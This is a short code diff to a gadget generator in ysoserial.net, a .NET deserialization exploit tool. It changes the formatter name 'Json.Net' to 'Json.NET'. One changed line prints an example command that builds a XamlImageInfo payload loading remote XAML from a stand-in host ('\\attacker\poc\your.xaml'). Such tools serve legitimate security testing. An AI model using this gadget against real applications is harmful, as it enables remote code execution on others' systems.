@@ -26,7 +26,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Json.Net" }; // MessagePack may work too, but it may have issues with the XamlImageInfo constructor (to be verified)
+            return new List<string> { "Json.NET" }; // MessagePack may work too, but it may have issues with the XamlImageInfo constructor (to be verified)
         }
 
         public override string Name()
@@ -118,7 +118,7 @@ namespace ysoserial.Generators
                 {                    
                     if (inputArgs.Test)
                     {
-                        Console.WriteLine("This gadget loads remote/local file: -c argument should provide a file path to your XAML file. UNC path can be used for the remote file loading\r\nExample: ysoserial.exe -g XamlImageInfo -f Json.Net -c '\\\\attacker\\poc\\your.xaml'");
+                        Console.WriteLine("This gadget loads remote/local file: -c argument should provide a file path to your XAML file. UNC path can be used for the remote file loading\r\nExample: ysoserial.exe -g XamlImageInfo -f Json.NET -c '\\\\attacker\\poc\\your.xaml'");
                     }
 
                     inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
